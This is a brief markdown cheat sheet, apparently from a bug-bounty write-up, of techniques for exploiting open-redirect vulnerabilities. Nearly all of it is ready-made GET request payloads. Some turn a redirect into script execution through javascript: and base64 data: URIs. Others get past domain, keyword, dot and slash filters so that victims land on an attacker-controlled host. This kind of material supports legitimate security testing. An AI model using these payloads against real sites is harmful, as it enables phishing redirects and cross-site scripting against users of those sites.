### Description

Here are some techniques which can be helpful when exploiting the case of an open redirect (OR). Thanks to: bobrov, filedescriptor, cujanovic, securityidiots
This is a handy version of my article on Medium ([Link](https://medium.com/bugbountywriteup/cvv-2-open-redirect-213555765607)).

### Techniques
**[1] JavaScript Execution**  
Converting an open-redirect to Cross-Site-Scripting by using different URI-schemes
```
GET file.php?url=javascript:alert(1)
---
GET file.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4NCg==
```
**[2] Bypassing keyword filtering**  
By using the legitimate domain as part of the URL (e.g. as subdomain)
```
GET file.php?url=victim.com.attacker.com
```
By using the `@` sign to request a login, redirecting to the attacker-controlled domain
```
GET file.php?url=victim.com@attacker.com
```
By creating a folder named like the legitimate domain (this also can be useful if an extension is required; second example)
```
GET file.php?url=attacker.com/victim.com
---
GET file.php?url=attacker.com/.jpg
```

**[3] Bypassing blacklisted keywords**  
Most filters can be bypassed by using a double- or triple-URL encoded version of the blacklisted char/keyword. Otherwise:
Use `  。` (a Chinese separator) to bypass dot-filtering
```
GET file.php?url=https://attacker%E3%80%82com
```
Use slashes to bypass `http/https` keyword-filtering
```
GET file.php?url=//attacker.com
---
GET file.php?url=\/\/attacker.com
```
Avoid slash-filtering by avoiding them in the URL too (this is valid and will be resolved)
```
GET file.php?url=https:attacker.com
```
